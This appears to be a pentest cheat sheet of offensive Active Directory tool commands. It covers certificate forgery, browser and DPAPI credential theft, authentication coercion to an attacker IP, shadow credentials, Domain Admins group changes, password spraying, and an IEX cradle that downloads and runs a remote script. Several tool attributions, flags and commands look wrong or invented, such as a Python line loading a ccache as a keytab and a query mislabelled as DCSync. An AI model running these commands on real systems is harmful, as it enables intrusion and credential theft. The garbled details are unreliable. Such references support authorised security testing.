# <span style="color:rgb(255, 192, 0)">Miscellaneous AD Tools - Complete Command Reference</span>

This section covers additional AD tools not covered in the main reference files.

---

## <span style="color:rgb(255, 0, 0)">1. SharpHound - Alternative Context</span>

SharpHound by @SpecterOps is the data collector for BloodHound.
Full reference in `03_BloodHound.md`. This section has additional context.

```powershell
# All collection flags
SharpHound.exe -c All -d domain.local --OutputDirectory C:\temp\ --ZipFileName output.zip

# LDAP username/password
SharpHound.exe -c All --LdapUsername user@domain.local --LdapPassword pass

# Cache for large domains
SharpHound.exe -c All --CacheName cache.bin

# Loop collection
SharpHound.exe -c All --Loop --LoopInterval 00:10:00

# Stealth mode
SharpHound.exe -c DCOnly --Stealth

# Collection with specified domain controller
SharpHound.exe -c All --DomainController dc01.domain.local

# Real-time monitoring
SharpHound.exe --RealTime --CollectionInterval 30

# Skip port scanning
SharpHound.exe -c All --SkipPortScan

# Override username (for domain-joined)
SharpHound.exe -c All --OverrideUserName user --OverridePassword pass

# Exclude DCs
SharpHound.exe -c All --ExcludeDCs

# Disable Kerberos signing
SharpHound.exe -c All --DisableKerberosSigning

# JSON output only
SharpHound.exe -c All --NoZip

# Output prefix
SharpHound.exe -c All --OutputPrefix bloodhound_

# Search base
SharpHound.exe --SearchBase "OU=Servers,DC=domain,DC=local"
```

---

## <span style="color:rgb(0, 176, 240)">2. Certify</span>

Certify by @harmj0y/@_dirkjan is the C# version of Certipy for ADCS abuse.

### Compiling

```bash
# Open in Visual Studio
# Or csc:
csc.exe /reference:System.DirectoryServices.dll Certify.cs
```

### Commands

```powershell
# Find ADCS servers and templates
Certify.exe find

# Find vulnerable templates
Certify.exe find /vulnerable

# Find with show all options
Certify.exe find /showAll

# Find with CA details
Certify.exe find /ca:<CA-NAME>

# Find by domain
Certify.exe find /domain:target.local

# Request certificate
Certify.exe request /ca:<CA-NAME>\<CA-HOST> /template:User

# Request with SAN (ESC1)
Certify.exe request /ca:<CA-NAME>\<CA-HOST> /template:Vulnerable-Template /altname:administrator@domain.local

# Request with machine template
Certify.exe request /ca:<CA-NAME>\<CA-HOST> /template:Machine /machine

# Request with enrollment agent (ESC3)
Certify.exe request /ca:<CA-NAME>\<CA-HOST> /template:EnrollmentAgent /enrollmentagent

# Request on-behalf-of (ESC3)
Certify.exe request /ca:<CA-NAME>\<CA-HOST> /template:User /onbehalfof:domain\Administrator /enrollmentcert:agent.pfx

# Download issued cert
Certify.exe download /ca:<CA-NAME>\<CA-HOST> /id:<REQUEST-ID>

# Get certificate info
Certify.exe info /cert:<CERT-FILE>

# Check weak certificate mapping
Certify.exe find /clientauth
```

### Certify Output to Certipy

```bash
# Convert Certify PFX to usable format
# Certipy can auth with any PFX:
certipy auth -pfx cert.pfx -dc-ip 10.0.0.1
```

---

## <span style="color:rgb(146, 208, 80)">3. ForgeCert</span>

ForgeCert by @TheRealWover creates golden certificates from stolen CA certificates.

```bash
# Golden certificate creation
ForgeCert.exe --CaCertPath CA.pfx --CaCertPassword pass --Subject "CN=Administrator" --SubjectAltName "administrator@domain.local" --NewCertPath forged.pfx

# Golden certificate with specific template
ForgeCert.exe --CaCertPath CA.pfx --CaCertPassword pass --Subject "CN=Administrator" --SubjectAltName "administrator@domain.local" --NewCertPath forged.pfx --Template Administrator

# Usage after creation
certipy auth -pfx forged.pfx -dc-ip 10.0.0.1
```

---

## <span style="color:rgb(255, 0, 0)">4. Inveigh</span>

Full reference in `06_Responder_Inveigh.md`. Quick reference below:

```powershell
# PowerShell version
Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -LLMNR Y -NBNS Y -mDNS Y -HTTP Y -HTTPS Y

# C# version
InveighZero.exe -All Y -Console Y -File Y
```

---

## <span style="color:rgb(0, 176, 240)">5. SharpDPAPI</span>

SharpDPAPI by @harmj0y is a C# port of Mimikatz's DPAPI functionality.

```powershell
# List all master keys
SharpDPAPI.exe masterkeys

# List master keys with GUIDs
SharpDPAPI.exe masterkeys /guid

# Decrypt master key with password
SharpDPAPI.exe masterkey /password:pass /target:GUID

# Decrypt master key with domain backup key
SharpDPAPI.exe masterkey /pvk:backupkey.pvk /target:GUID

# Decrypt master key with NT hash
SharpDPAPI.exe masterkey /ntlm:NTLM /target:GUID

# Decrypt master keys with RPC (domain joined)
SharpDPAPI.exe masterkeys /rpc

# Decrypt all machine master keys
SharpDPAPI.exe machinemasterkeys

# Decrypt machine master key with RPC
SharpDPAPI.exe machinemasterkeys /rpc

# Backup key extraction
SharpDPAPI.exe backupkeys /server:dc01.domain.local

# Backup key via explicit creds
SharpDPAPI.exe backupkeys /server:dc01.domain.local /user:domain\Administrator /password:pass

# Backup key via hash
SharpDPAPI.exe backupkeys /server:dc01.domain.local /user:domain\Administrator /hash:NTLM

# Backup key via PVK
SharpDPAPI.exe backupkeys /pvk:backupkey.pvk

# Decrypt Chrome cookies
SharpDPAPI.exe chromecookies

# Decrypt Chrome passwords
SharpDPAPI.exe chromepasswords

# Decrypt Edge cookies
SharpDPAPI.exe edgecookies

# Decrypt all browser data
SharpDPAPI.exe browsers

# Decrypt IIS application pool credentials
SharpDPAPI.exe iiscred

# Decrypt RDP saved credentials
SharpDPAPI.exe rdp

# All decryption
SharpDPAPI.exe all
```

---

## <span style="color:rgb(146, 208, 80)">6. SharpChrome</span>

SharpChrome by @harmj0y (part of SharpDPAPI) targets Chromium-based browser data.

```powershell
# Recover Chrome passwords
SharpChrome.exe logins

# Recover Chrome cookies
SharpChrome.exe cookies

# Recover Chrome history
SharpChrome.exe history

# Recover Chrome saved credit cards
SharpChrome.exe creditcards

# Decrypt with specific master key
SharpChrome.exe logins /masterkey:KEY

# Decrypt with specific state key
SharpChrome.exe logins /statekey:KEY

# Export cookies as Netscape format
SharpChrome.exe cookies /format:netscape

# Specify Chrome user data path
SharpChrome.exe logins /target:C:\Users\User\AppData\Local\Google\Chrome\User Data

# Edge browser (Chromium-based)
SharpChrome.exe logins /target:C:\Users\User\AppData\Local\Microsoft\Edge\User Data
```

---

## <span style="color:rgb(255, 0, 0)">7. Coercer</span>

Coercer by @podalirius forces Windows machines to authenticate to an attacker-controlled machine.

```bash
# Basic usage (coerce all methods)
coercer coerce -l attackerIP -t targetIP -u user -p pass -d domain.local

# List all available methods
coercer coerce -l attackerIP -t targetIP -u user -p pass -d domain.local --list-methods

# Specific method
coercer coerce -l attackerIP -t targetIP -u user -p pass -d domain.local \
  --method "PetitPotam"

# Multiple targets
coercer coerce -l attackerIP -t targets.txt -u user -p pass -d domain.local

# With NTLM hash
coercer coerce -l attackerIP -t targetIP -u user -H :NTLM -d domain.local

# With Kerberos
coercer coerce -l attackerIP -t targetIP -u user -p pass -d domain.local -k

# Start in web server mode (generate URL for external coercion)
coercer serve -l attackerIP -u user -p pass -d domain.local

# Verbose
coercer coerce -l attackerIP -t targetIP -u user -p pass -d domain.local -v

# Debug
coercer coerce -l attackerIP -t targetIP -u user -p pass -d domain.local --debug

# Timeout
coercer coerce -l attackerIP -t targetIP -u user -p pass -d domain.local --timeout 30
```

### Available Coercion Methods

| Method | Protocol | Port |
|--------|----------|------|
| PetitPotam (MS-EFSRPC) | EFSRPC | 445 |
| PrinterBug (MS-RPRN) | RPC | 445 |
| DFSCoerce (MS-DFSNM) | RPC | 445 |
| EFsRpcOpenFileRaw | EFSRPC | 445 |
| EfsRpcEncryptFileSrv | EFSRPC | 445 |
| EfsRpcDecryptFileSrv | EFSRPC | 445 |
| EfsRpcQueryUsersOnFile | EFSRPC | 445 |
| EfsRpcQueryRecoveryAgents | EFSRPC | 445 |

---

## <span style="color:rgb(0, 176, 240)">8. KrbRelay</span>

KrbRelay by @Cubolico uses Kerberos delegation to relay to LDAP.

```bash
# Basic relay (incoming HTTP -> LDAP to DC)
KrbRelay.exe -spn ldap/dc01.domain.local -clsid 90f18417-0f0f-4841-af2f-7d8f0b4d5f27

# With SSL
KrbRelay.exe -spn ldap/dc01.domain.local -clsid 90f18417-0f0f-4841-af2f-7d8f0b4d5f27 -ssl

# Specific CLSID
KrbRelay.exe -spn ldap/dc01.domain.local -clsid {CLSID}

# With session key
KrbRelay.exe -spn ldap/dc01.domain.local -clsid 90f18417-0f0f-4841-af2f-7d8f0b4d5f27 -sessionkey

# Shadow credentials attack
KrbRelay.exe -spn ldap/dc01.domain.local -clsid 90f18417-0f0f-4841-af2f-7d8f0b4d5f27 -shadowcred

# List available CLSIDs
KrbRelay.exe -list
```

### Shadow Credentials

```bash
# KrbRelay with Shadow Credentials
# 1. Requires Workstation or Server with unconstrained delegation
# 2. Or use KrbRelay to relay to LDAP and add KeyCredential

KrbRelay.exe -spn ldap/dc01.domain.local -clsid 90f18417-0f0f-4841-af2f-7d8f0b4d5f27 -shadowcred

# After adding shadow credential, get TGT:
certipy auth -pfx shadowcred.pfx -dc-ip 10.0.0.1
```

---

## <span style="color:rgb(146, 208, 80)">9. PyWhisker</span>

PyWhisker by @ShutdownRepo manages msDS-KeyCredentialLink (Shadow Credentials).

```bash
# Add key credential to a target user
pywhisker.py -d domain.local -u 'user' -p 'pass' --target 'targetuser' --action add --filename output

# List existing key credentials
pywhisker.py -d domain.local -u 'user' -p 'pass' --target 'targetuser' --action list

# Remove key credential
pywhisker.py -d domain.local -u 'user' -p 'pass' --target 'targetuser' --action remove --device-id DEVICE_ID

# Clear all key credentials
pywhisker.py -d domain.local -u 'user' -p 'pass' --target 'targetuser' --action clear

# With NTLM hash
pywhisker.py -d domain.local -u 'user' -H :NTLM --target 'targetuser' --action add

# With Kerberos
pywhisker.py -d domain.local -u 'user' -p 'pass' -k --target 'targetuser' --action add

# Specify DC
pywhisker.py -d domain.local -u 'user' -p 'pass' --target 'targetuser' --action add --dc-ip 10.0.0.1

# Export PFX
pywhisker.py -d domain.local -u 'user' -p 'pass' --target 'targetuser' --action add --filename targetuser

# Use with certipy (auth with the PFX)
certipy auth -pfx targetuser.pfx -dc-ip 10.0.0.1
```

---

## <span style="color:rgb(255, 0, 0)">10. PKINITtools</span>

PKINITtools by @dirkjanm provide Kerberos PKINIT (smartcard/PKCS) authentication.

```bash
# Get TGT using certificate (PKINIT)
gettgtpkinit.py -cert-pfx certificate.pfx domain.local/user@domain.local user.ccache

# Get TGT using PFX with password
gettgtpkinit.py -cert-pfx certificate.pfx -pfx-pass 'pass' domain.local/user user.ccache

# Get NTLM hash from TGT (via PKINIT)
getnthash.py -key <AS-REP encryption key> domain.local/user user.ccache

# Get NTLM hash directly from PKINIT
# Combine:
gettgtpkinit.py -cert-pfx cert.pfx domain.local/user user.ccache
getnthash.py -key $(python3 -c "from impacket.krb5.keytab import Keytab; kt = Keytab.load('user.ccache'); print(kt[0]['key'])") domain.local/user user.ccache

# Get NTLM from TGT
getnthash.py domain.local/user user.ccache
```

---

## <span style="color:rgb(0, 176, 240)">11. adidnsdump</span>

adidnsdump by @dirkjanm dumps all AD-integrated DNS records.

```bash
# Dump all DNS records
adidnsdump -u domain\\user -p pass domain.local

# Dump with NTLM hash
adidnsdump -u domain\\user -H :NTLM domain.local

# Dump all records including LDAP
adidnsdump -u domain\\user -p pass domain.local --all

# With Kerberos
adidnsdump -u domain\\user -p pass -k domain.local

# Output to directory
adidnsdump -u domain\\user -p pass domain.local --output-dir dns_dump

# Resolve IPs
adidnsdump -u domain\\user -p pass domain.local --resolve

# Only forward lookup zones
adidnsdump -u domain\\user -p pass domain.local --forward

# Only reverse lookup zones
adidnsdump -u domain\\user -p pass domain.local --reverse

# Debug
adidnsdump -u domain\\user -p pass domain.local --debug
```

---

## <span style="color:rgb(146, 208, 80)">12. BloodHound-Python</span>

BloodHound.py by @dirkjanm is the Python implementation of SharpHound.
Full reference in `03_BloodHound.md`. Quick reference:

```bash
# Basic collection
bloodhound-python -u user -p pass -d domain.local -dc dc01.domain.local -c All

# DCOnly collection
bloodhound-python -u user -p pass -d domain.local -dc dc01.domain.local -c DCOnly

# With NTLM hash
bloodhound-python -u user -H :NTLM -d domain.local -dc dc01.domain.local -c All

# Zip output
bloodhound-python -u user -p pass -d domain.local -dc dc01.domain.local --zip

# With LDAPS
bloodhound-python -u user -p pass -d domain.local -dc dc01.domain.local -c All --ldaps
```

---

## <span style="color:rgb(255, 0, 0)">13. ADRecon</span>

ADRecon by @sense-of-security is a PowerShell tool for comprehensive AD reconnaissance.

```powershell
# Load and run
Import-Module ADRecon.ps1
Invoke-ADRecon

# Specific domain
Invoke-ADRecon -DomainController dc01.domain.local -Credential domain\user

# With credentials
$creds = Get-Credential
Invoke-ADRecon -DomainController dc01.domain.local -Credential $creds

# Specific categories
Invoke-ADRecon -Collect Users,Groups,Computers,Trusts
Invoke-ADRecon -Collect DomainInfo

# Output directory
Invoke-ADRecon -OutputDir C:\ADReconResults

# Generate HTML report
Invoke-ADRecon -GenerateHTML

# Collect all
Invoke-ADRecon -Collect All -GenerateHTML

# Use explicit domain
Invoke-ADRecon -Domain target.local -DomainController dc01 -OutputDir C:\recon
```

---

## <span style="color:rgb(0, 176, 240)">14. ldapdomaindump</span>

ldapdomaindump by @dirkjanm dumps AD information via LDAP to human-readable files.

```bash
# Basic dump
ldapdomaindump -u domain\\user -p pass 10.0.0.1

# With NTLM hash
ldapdomaindump -u domain\\user -H :NTLM 10.0.0.1

# Output to directory
ldapdomaindump -u domain\\user -p pass 10.0.0.1 -o ldap_dump/

# Only machine accounts
ldapdomaindump -u domain\\user -p pass 10.0.0.1 --filter-machine-accounts

# Without SMB connection
ldapdomaindump -u domain\\user -p pass 10.0.0.1 --no-html

# JSON output only
ldapdomaindump -u domain\\user -p pass 10.0.0.1 --json

# With Kerberos
ldapdomaindump -u domain\\user -p pass -k 10.0.0.1

# Resolve DNS
ldapdomaindump -u domain\\user -p pass 10.0.0.1 --dns

# Use LDAPS
ldapdomaindump -u domain\\user -p pass 10.0.0.1 --ldaps

# Debug
ldapdomaindump -u domain\\user -p pass 10.0.0.1 --debug
```

### Output Files

```
domain_users.html    - Users in browser-readable format
domain_users.json    - Users in JSON format
domain_groups.html   - Groups in browser-readable format  
domain_groups.json   - Groups in JSON format
domain_computers.html - Computers in browser format
domain_computers.json - Computers in JSON format
domain_policy.html   - Domain policy
domain_trusts.html   - Domain trusts
domain_trusts.json   - Domain trusts in JSON
```

---

## <span style="color:rgb(146, 208, 80)">15. enum4linux-ng</span>

enum4linux-ng is a Python rewrite of enum4linux for Windows/Samba enumeration via SMB/RPC.

```bash
# Basic enumeration
enum4linux-ng target -u user -p pass

# Null session (no creds)
enum4linux-ng target -u '' -p ''

# With NTLM hash
enum4linux-ng target -u user -H NTLM

# Specific categories
enum4linux-ng target -u user -p pass -A  # All
enum4linux-ng target -u user -p pass -U  # Users
enum4linux-ng target -u user -p pass -G  # Groups
enum4linux-ng target -u user -p pass -S  # Shares
enum4linux-ng target -u user -p pass -P  # Password policy
enum4linux-ng target -u user -p pass -R  # RID cycling
enum4linux-ng target -u user -p pass -O  # OS info

# Output to file
enum4linux-ng target -u user -p pass -A -oA output

# Colors off
enum4linux-ng target -u user -p pass -A --no-colors
```

### Categories

| Flag | Category | Description |
|------|----------|-------------|
| `-A` | All | All checks |
| `-U` | Users | Enumerate users |
| `-G` | Groups | Enumerate groups |
| `-S` | Shares | Enumerate shares |
| `-P` | Password policy | Password policy info |
| `-R` | RID cycling | Brute force user RIDs |
| `-O` | OS info | OS version info |
| `-L` | Ldap | LDAP info |

---

## <span style="color:rgb(255, 0, 0)">16. smbmap</span>

smbmap by @ShawnDEvans enumerates SMB shares and permissions.

```bash
# List shares and permissions
smbmap -H target -u user -p pass

# Recursive listing of all shares
smbmap -H target -u user -p pass -R

# Recursive on specific share
smbmap -H target -u user -p pass -r 'C$'

# Download file
smbmap -H target -u user -p pass --download 'C$\Users\Administrator\NTUSER.DAT'

# Upload file
smbmap -H target -u user -p pass --upload /local/file 'C$\Temp\file'

# Execute command
smbmap -H target -u user -p pass -x 'whoami'

# Execute PowerShell
smbmap -H target -u user -p pass -x 'powershell -Command "whoami"'

# Pass-the-hash
smbmap -H target -u user -p pass -H NTLM_HASH

# Null session
smbmap -H target -u '' -p ''

# Guest session
smbmap -H target -u 'guest' -p ''

# Domain admin
smbmap -H target -u domain\\user -p pass -d domain

# Check all targets in file
smbmap -H targets.txt -u user -p pass

# Verbose
smbmap -H target -u user -p pass -v

# Specify SMB port
smbmap -H target -u user -p pass --port 445

# Output to file
smbmap -H target -u user -p pass -R > shares.txt

# Only show writable shares
smbmap -H target -u user -p pass | grep "WRITE"
```

### Common Patterns

```bash
# Full enumeration
smbmap -H target -u user -p pass -R -q

# Search for interesting files
smbmap -H target -u user -p pass -R -A "password|secret|backup|xls" -q

# Download specific file
smbmap -H target -u user -p pass --download 'SYSVOL\domain.local\Policies\*.xml'

# Check all domain controllers
for dc in $(cat dcs.txt); do
  smbmap -H $dc -u user -p pass
done
```

---

## <span style="color:rgb(0, 176, 240)">17. smbclient</span>

smbclient (part of Samba suite) for SMB/CIFS file operations.

```bash
# List shares (null session)
smbclient -L target -N

# List shares (with creds)
smbclient -L target -U domain/user%pass

# Connect to share (null session)
smbclient //target/IPC$ -N

# Connect with creds
smbclient //target/C$ -U domain/user%pass

# Connect with NTLM hash (requires ext syntax)
smbclient //target/C$ --option='client ntlmv2 auth=yes' -U domain/user --pw-nt-hash NTLM_HASH

# Directory listing (once connected)
ls
ls folder\
cd folder

# Download file
get file.txt
get folder\file.txt /local/path/

# Upload file
put localfile.txt
put /local/path/file.txt folder\file.txt

# Recursive download
recurse ON
mget *

# Recursive upload
recurse ON
mput *

# Create directory
mkdir newfolder

# Delete file
rm file.txt

# Interactive shell (once connected)
smb: \> ls
smb: \> cd share
smb: \> get file.txt
smb: \> exit
```

### Common Tasks

```bash
# Check SMB signing (null session)
smbclient -L target -N
# If it responds to null session, signing is likely disabled

# Access SYSVOL
smbclient //dc01/SYSVOL -U domain/user%pass

# Access ADMIN$
smbclient //target/ADMIN$ -U domain/user%pass

# Connect with Kerberos
KRB5CCNAME=ticket.ccache smbclient //target.domain.local/C$ -k

# Download Group Policy files
smbclient //dc01/SYSVOL -U domain/user%pass -c 'cd domain.local\Policies; ls; recurse; mget *'
```

---

## <span style="color:rgb(255, 0, 0)">18. bloodyAD</span>

bloodyAD by @CravateRouge is a Python tool for Active Directory privilege escalation and ACL abuse via LDAP/ADSI.

```bash
# Authentication
bloodyAD --host 10.10.10.10 -d domain.local -u user -p pass
bloodyAD --host 10.10.10.10 -d domain.local -u user -H :NTLM_HASH
bloodyAD --host 10.10.10.10 -d domain.local -u user -p pass -k  # Kerberos

# User management
bloodyAD --host 10.10.10.10 -d domain.local -u user -p pass add user newuser
bloodyAD --host 10.10.10.10 -d domain.local -u user -p pass add user newuser --password Pass123!
bloodyAD --host 10.10.10.10 -d domain.local -u user -p pass del user "CN=newuser,CN=Users,DC=domain,DC=local"

# Group management
bloodyAD --host 10.10.10.10 -d domain.local -u user -p pass add groupmember "Domain Admins" newuser

# Object attributes
bloodyAD --host 10.10.10.10 -d domain.local -u user -p pass set object "CN=target,CN=Users,DC=domain,DC=local" --attr servicePrincipalName --value "HTTP/target.domain.local"

# Object search
bloodyAD --host 10.10.10.10 -d domain.local -u user -p pass get object "CN=Administrator,CN=Users,DC=domain,DC=local"
bloodyAD --host 10.10.10.10 -d domain.local -u user -p pass get children "CN=Users,DC=domain,DC=local"

# Shadow credentials
bloodyAD --host 10.10.10.10 -d domain.local -u user -p pass set shadow "CN=target,CN=Users,DC=domain,DC=local"
bloodyAD --host 10.10.10.10 -d domain.local -u user -p pass remove shadow "CN=target,CN=Users,DC=domain,DC=local"

# RBCD (Resource-Based Constrained Delegation)
bloodyAD --host 10.10.10.10 -d domain.local -u user -p pass set rbcd "CN=computer,CN=Computers,DC=domain,DC=local" "CN=attacker,CN=Computers,DC=domain,DC=local"
bloodyAD --host 10.10.10.10 -d domain.local -u user -p pass remove rbcd "CN=computer,CN=Computers,DC=domain,DC=local"

# Password spray
bloodyAD --host 10.10.10.10 -d domain.local -u user -p pass test password --password 'Password123!'

# DCSync (with appropriate rights)
bloodyAD --host 10.10.10.10 -d domain.local -u user -p pass get object "DC=domain,DC=local" --attrs msDS-RevealedUsers
```

### Key features
- LDAP/ADSI operations
- Shadow credentials management (msDS-KeyCredentialLink)
- RBCD abuse
- Group membership modification
- Password spraying via LDAP
- Object attribute manipulation (add SPNs, etc.)

---

## <span style="color:rgb(0, 176, 240)">19. adPEAS</span>

adPEAS (Active Directory Privilege Escalation Attack Suite) by @61106960 is a PowerShell tool for AD security auditing and privilege escalation.

```powershell
# Load module
Import-Module .\adPEAS.ps1

# Run all checks
Invoke-adPEAS

# Check as current user
Invoke-adPEAS -CurrentUser

# Check specific categories
Invoke-adPEAS -ADCS
Invoke-adPEAS -PrivEsc
Invoke-adPEAS -Delegation
Invoke-adPEAS -Trusts
Invoke-adPEAS -LAPS
Invoke-adPEAS -GPO

# Output to file
Invoke-adPEAS -OutputFile C:\temp\adpeas.txt

# Highlight findings
Invoke-adPEAS -HighLight

# With credentials
$creds = Get-Credential
Invoke-adPEAS -Credential $creds

# Specific domain controller
Invoke-adPEAS -DomainController dc01.domain.local
```

### Categories checked
- Delegation (unconstrained, constrained, RBCD)
- ADCS vulnerable templates
- Kerberoastable accounts
- AS-REP roastable accounts
- GPO vulnerabilities
- LAPS configuration
- Trust relationships
- AdminSDHolder
- ACL abuse paths
- SYSVOL/GPP passwords

---

## <span style="color:rgb(146, 208, 80)">20. LDAPRelayScan</span>

LDAPRelayScan by @zyn3rgy identifies LDAP servers vulnerable to NTLM relay (missing LDAP signing/channel binding).

```bash
# Basic scan
python3 LDAPRelayScan.py -target 10.10.10.10

# Scanne subnet
python3 LDAPRelayScan.py -target 10.10.10.0/24

# With credentials (authenticated check)
python3 LDAPRelayScan.py -target 10.10.10.10 -u user -p pass

# Only check signing
python3 LDAPRelayScan.py -target 10.10.10.10 --check-signing

# Only check channel binding
python3 LDAPRelayScan.py -target 10.10.10.10 --check-binding

# Verbose output
python3 LDAPRelayScan.py -target 10.10.10.10 -v

# Output to file
python3 LDAPRelayScan.py -target 10.10.10.10 -o results.txt
```

### Output
```
[+] LDAP Signing: Disabled  <-- Vulnerable
[+] LDAP Channel Binding: Disabled  <-- Vulnerable
[-] LDAP Signing: Enabled  <-- Not vulnerable
```

---

## <span style="color:rgb(255, 0, 0)">21. LockSmith</span>

LockSmith by @HackAndDo is an ADCS misconfiguration finder that checks certificate templates, enrollment rights, and CA settings.

```bash
# Basic scan
python3 LockSmith.py -dc-ip 10.10.10.10 -u user -p pass -d domain.local

# Check all templates
python3 LockSmith.py -dc-ip 10.10.10.10 -u user -p pass -d domain.local --all

# Check vulnerable templates only
python3 LockSmith.py -dc-ip 10.10.10.10 -u user -p pass -d domain.local --vuln-only

# Export results
python3 LockSmith.py -dc-ip 10.10.10.10 -u user -p pass -d domain.local -o output.txt

# Check with NTLM hash
python3 LockSmith.py -dc-ip 10.10.10.10 -u user -H :NTLM -d domain.local

# Verbose
python3 LockSmith.py -dc-ip 10.10.10.10 -u user -p pass -d domain.local -v
```

### Checks performed
- ESC1 (SAN in template, enrollee supplies SAN)
- ESC2 (Any Purpose EKU)
- ESC3 (Enrollment Agent)
- ESC4 (Template ACLs)
- ESC5/ESC6 (CA settings)
- ESC8 (Web Enrollment NTLM relay)
- ESC9/ESC10 (No Security Extension)

---

## <span style="color:rgb(0, 176, 240)">22. BlueTuxedo</span>

BlueTuxedo by @thesubtlety is an AD-IDNS auditing tool for discovering DNS vulnerabilities and misconfigurations.

```bash
# Basic audit
python3 BlueTuxedo.py -dc-ip 10.10.10.10 -d domain.local -u user -p pass

# Check zone transfers
python3 BlueTuxedo.py -dc-ip 10.10.10.10 -d domain.local -u user -p pass --zone-transfer

# Check DNS ACLs
python3 BlueTuxedo.py -dc-ip 10.10.10.10 -d domain.local -u user -p pass --acl-check

# Check for secure dynamic updates
python3 BlueTuxedo.py -dc-ip 10.10.10.10 -d domain.local -u user -p pass --secure-updates

# Full audit
python3 BlueTuxedo.py -dc-ip 10.10.10.10 -d domain.local -u user -p pass --all

# Only check specific zones
python3 BlueTuxedo.py -dc-ip 10.10.10.10 -d domain.local -u user -p pass --zones _msdcs.domain.local,domain.local
```

### Findings
- DNS zones allowing unsigned updates
- Zone transfer misconfigurations
- Permissive DNS ACLs
- DNSSEC configuration issues
- AD-IDNS delegation vulnerabilities
- DNS records pointing to deprecated systems

---

## <span style="color:rgb(146, 208, 80)">23. PowerSharpPack</span>

PowerSharpPack by @S3cur3Th1sSh1t packages common offensive .NET tools as PowerShell functions with reflective loading. All tools load in-memory with no disk writes.

```powershell
# Load from URL
IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.5/PowerSharpPack.ps1')
# Or from disk
Import-Module .\PowerSharpPack.ps1

# Available tool wrappers
Invoke-Rubeus -Command "kerberoast"
Invoke-Rubeus -Command "asreproast"
Invoke-Seatbelt -Command "-group=user"
Invoke-SharpHound -Command "-c All -d domain.local"
Invoke-SharpUp -Command "audit"
Invoke-Certify -Command "find /vulnerable"
Invoke-SharpDPAPI -Command "machinecredentials"
Invoke-SharpChrome -Command "logins"
Invoke-SharpKatz -Command "--Command logonpasswords"
Invoke-SharpView -Command "Get-NetUser"
Invoke-StandIn -Command "--help"
Invoke-SharpWMI -Command "action=exec computername=target cmd=whoami"
Invoke-Watson
```

Full reference in `02_Initial_Access/12_Execution_Methods.md`.

---

## <span style="color:rgb(255, 0, 0)">24. Group3r</span>

Group3r by @dafthack finds GPO misconfigurations and security weaknesses by parsing all GPOs.

```bash
# Basic audit
Group3r.exe -d domain.local -u user -p pass

# With domain controller
Group3r.exe -d domain.local -u user -p pass -dc dc01

# Specify search base
Group3r.exe -d domain.local -u user -p pass -ou "OU=Workstations,DC=domain,DC=local"

# Output to file
Group3r.exe -d domain.local -u user -p pass -o C:\temp\results.txt

# Verbose
Group3r.exe -d domain.local -u user -p pass -v

# JSON output
Group3r.exe -d domain.local -u user -p pass -j
```

### Categories
- Privileged group memberships via GPO
- Service account credentials in GPO
- Startup/shutdown scripts
- Registry settings with weak permissions
- File ACL vulnerabilities
- GPO links to wrong OUs
- Unrestricted GPO modification rights
- Password policies via GPO

---

## <span style="color:rgb(0, 176, 240)">25. AD-Miner</span>

AD-Miner by @MazarsECurity uses BloodHound Cypher queries to generate automated security reports.

```bash
# Basic analysis (against BloodHound neo4j)
python3 AD-Miner.py -u neo4j -p password

# Specify query set
python3 AD-Miner.py -u neo4j -p password -q all
python3 AD-Miner.py -u neo4j -p password -q critical
python3 AD-Miner.py -u neo4j -p password -q privesc

# Output format
python3 AD-Miner.py -u neo4j -p password -o html
python3 AD-Miner.py -u neo4j -p password -o json

# Output directory
python3 AD-Miner.py -u neo4j -p password -o html -d ./reports/

# Custom queries
python3 AD-Miner.py -u neo4j -p password -q custom -f custom_queries.txt

# Specify neo4j URI
python3 AD-Miner.py -u neo4j -p password --uri bolt://10.10.10.10:7687
```

### Report categories
- Domain admin privilege escalation paths
- Kerberoastable / AS-REP roastable accounts
- Unconstrained delegation systems
- Constrained delegation abuse
- GPO abuse paths
- ADCS escalation paths
- ACL abuse opportunities
- Trust relationship analysis

---

## <span style="color:rgb(146, 208, 80)">26. GoodHound</span>

GoodHound by @idnahacks prioritizes BloodHound attack paths and generates actionable reports.

```bash
# Analyze BloodHound data
goodhound -d domain.local -u neo4j -p password

# Specify output directory
goodhound -d domain.local -u neo4j -p password -o ./reports/

# Tiered analysis (prioritized paths)
goodhound -d domain.local -u neo4j -p password --tiered

# Include kerberoasting paths
goodhound -d domain.local -u neo4j -p password --include-kerberoast

# Minimum path length filter
goodhound -d domain.local -u neo4j -p password --min-edges 2

# Maximum path length filter
goodhound -d domain.local -u neo4j -p password --max-edges 10

# Export to CSV
goodhound -d domain.local -u neo4j -p password -o report.csv --csv
```

### Features
- Path prioritization (shortest/fastest paths first)
- Removes noise (duplicate/symmetrical paths)
- Tiered analysis based on user privilege level
- HTML/CSV reporting
- Kerberoasting path integration
- Custom filtering

---

## <span style="color:rgb(255, 0, 0)">27. GPO-Hound</span>

GPO-Hound by @the_dise extracts GPO information and identifies GPO-based attack paths for BloodHound.

```bash
# Scan domain GPOs
gpo-hound -d domain.local -u user -p pass

# With NTLM hash
gpo-hound -d domain.local -u user -H :NTLM

# Output to BloodHound format
gpo-hound -d domain.local -u user -p pass -o bloodhound_data/

# Specific DC
gpo-hound -d domain.local -u user -p pass -dc dc01.domain.local

# Verbose
gpo-hound -d domain.local -u user -p pass -v

# JSON output
gpo-hound -d domain.local -u user -p pass --json

# All GPO details
gpo-hound -d domain.local -u user -p pass --all-gpos
```

### Data collected
- GPO linked to OUs
- GPO permission (who can modify)
- Restricted groups in GPO
- Scripts configured in GPO
- Registry settings in GPO
- File preferences (including cpassword)
- GPO inheritance tree

---

## <span style="color:rgb(0, 176, 240)">28. GPOZaurr</span>

GPOZaurr by @EvotecIT is a PowerShell module for GPO management, auditing, and security assessment.

```powershell
# Install module
Install-Module -Name GPOZaurr -Force

# Get GPO summary
Get-GPOZaurr -Type Summary

# Get GPO permissions
Get-GPOZaurr -Type Permission

# Find GPO misconfigurations
Get-GPOZaurr -Type Misconfiguration

# Find unused GPOs
Get-GPOZaurr -Type Unused

# Find GPO with errors
Get-GPOZaurr -Type Error

# Check specific GPO
Get-GPOZaurr -GPOName "Default Domain Policy"

# Check specific OU
Get-GPOZaurr -OU "OU=Workstations,DC=domain,DC=local"

# Export report
Get-GPOZaurr -Type All -ReportPath C:\Reports\GPO.html

# Cross-domain checks
Get-GPOZaurr -Type Permission -Domain target.local -ForestDomain
```

### Module features
- GPO permission auditing
- GPO security assessment
- Cross-domain GPO analysis
- HTML/CSV/XML reporting
- Misconfiguration detection
- GPO link analysis
